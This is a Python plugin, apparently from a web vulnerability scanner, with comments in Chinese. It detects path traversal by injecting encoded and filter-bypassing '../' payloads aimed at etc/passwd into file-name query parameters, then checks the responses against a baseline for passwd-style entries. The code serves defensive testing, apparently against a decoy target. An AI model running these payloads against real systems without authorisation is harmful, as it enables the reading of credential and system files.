"""路径穿越检测插件。

对文件读取类参数（path/file/filename）注入穿越 payload，若响应中出现
目标文件（etc/passwd 诱饵）的内容特征——``root:``/``daemon:`` 或标准
passwd 条目格式——且该特征在未注入的基线响应中不存在，才判定命中并
报告 high。

payload 由"穿越前缀 × 编码变体"两组部件组合生成，覆盖明文、单次编码
（``..%2f``、``%2e%2e%2f``）与双重编码（``..%252f``、``%252e%252e%252f``）
等写法；编码 payload 使用"原样拼接"写入 query，避免被再次编码。
命中后保留实际请求 URL 与响应片段作为证据。
"""

from __future__ import annotations

import re
from collections.abc import Callable

from ..crawl import Page, set_query_param
from ..plugin import Finding, Plugin, register_plugin

FILE_PARAMETERS = frozenset({"path", "file", "filename"})

# 穿越目标：从 target/files/ 向上两级到仓库根目录的诱饵 etc/passwd
TRAVERSAL_TARGET = "etc/passwd"

# 穿越前缀：两级（标准）、一级（部分应用直接可达）、双写（过滤关键字的绕过）
TRAVERSAL_PREFIXES: tuple[str, ...] = (
    "../../",
    "../",
    "....//....//",
)

# 标准 passwd 条目：name:passwd:uid:gid[:gecos]:home:shell
_PASSWD_ENTRY_RE = re.compile(r"^[\w.\-]+:[^:\n]*:\d+:\d+:", re.MULTILINE)


def _encode_slash(value: str) -> str:
    """只编码斜杠：``../`` -> ``..%2f``（点保持明文）。"""

    return value.replace("/", "%2f")


def _encode_slash_and_dots(value: str) -> str:
    """完全单次编码：``../`` -> ``%2e%2e%2f``。"""

    return value.replace(".", "%2e").replace("/", "%2f")


def _double_encode_slash(value: str) -> str:
    """双重编码斜杠：``/`` -> ``%252f``（点保持明文）。"""

    return value.replace("/", "%252f")


def _double_encode_slash_and_dots(value: str) -> str:
    """完全双重编码：``../`` -> ``%252e%252e%252f``。"""

    return value.replace(".", "%252e").replace("/", "%252f")


# 可组合的编码变体：名称仅用于测试与排障，函数作用于整条相对路径
ENCODING_VARIANTS: tuple[tuple[str, Callable[[str], str]], ...] = (
    ("plain", lambda value: value),
    ("slash_encoded", _encode_slash),
    ("full_encoded", _encode_slash_and_dots),
    ("double_encoded_slash", _double_encode_slash),
    ("double_encoded_full", _double_encode_slash_and_dots),
)


def build_payloads() -> tuple[str, ...]:
    """把穿越前缀与编码变体做笛卡尔组合，按"便宜（明文/单编码）优先"排序。

    组合后去重，例如双写前缀在明文变体下与单编码变体产生的形态不同，
    但部分变体可能生成相同字符串，这里统一保序去重。
    """

    payloads: list[str] = []
    seen: set[str] = set()
    for prefix in TRAVERSAL_PREFIXES:
        relative = f"{prefix}{TRAVERSAL_TARGET}"
        for _, encode in ENCODING_VARIANTS:
            payload = encode(relative)
            if payload not in seen:
                seen.add(payload)
                payloads.append(payload)
    return tuple(payloads)


# 依次尝试：明文 → 单次编码（..%2f / %2e%2e%2f）→ 双重编码（..%252f / %252e...）
PAYLOADS: tuple[str, ...] = build_payloads()

# 目标文件的内容特征：诱饵 etc/passwd 中必然出现的字段前缀
HIT_MARKERS: tuple[str, ...] = ("root:", "daemon:")


@register_plugin
class PathTraversalPlugin(Plugin):
    """目录穿越检测。"""

    name = "path_traversal"
    severity = "high"
    confidence = "high"
    description = "对文件读取参数注入目录穿越 payload，检查敏感文件内容"

    def match(self, page: Page) -> bool:
        return page.method.upper() == "GET" and any(
            parameter in FILE_PARAMETERS for parameter in page.params
        )

    def run(self, page: Page) -> list[Finding]:
        findings: list[Finding] = []
        file_parameters = [p for p in page.params if p in FILE_PARAMETERS]
        if not file_parameters:
            return findings

        # 基线：未注入时页面本来就有的内容，防止页面自身含 root: 等特征时误报
        baseline = self._client.get(page.url)
        baseline_marker = self._detect(baseline.text)

        for parameter in file_parameters:
            for payload in PAYLOADS:
                # encode=False：保留 ..%2f / ..%252f 这类已编码 payload 的原貌
                url = set_query_param(page.url, parameter, payload, encode=False)
                response = self._client.get(url)
                marker = self._detect(response.text)
                if marker is None or marker == baseline_marker:
                    continue
                findings.append(
                    self.make_finding(
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        status_code=response.status_code,
                        body=response.text,
                        marker=marker,
                    )
                )
                break
        return findings

    @staticmethod
    def _detect(body: str) -> str | None:
        """返回响应中命中的目标文件特征；没有任何特征时返回 None。"""

        for marker in HIT_MARKERS:
            if marker in body:
                return marker
        match = _PASSWD_ENTRY_RE.search(body)
        if match is not None:
            return match.group(0)
        return None
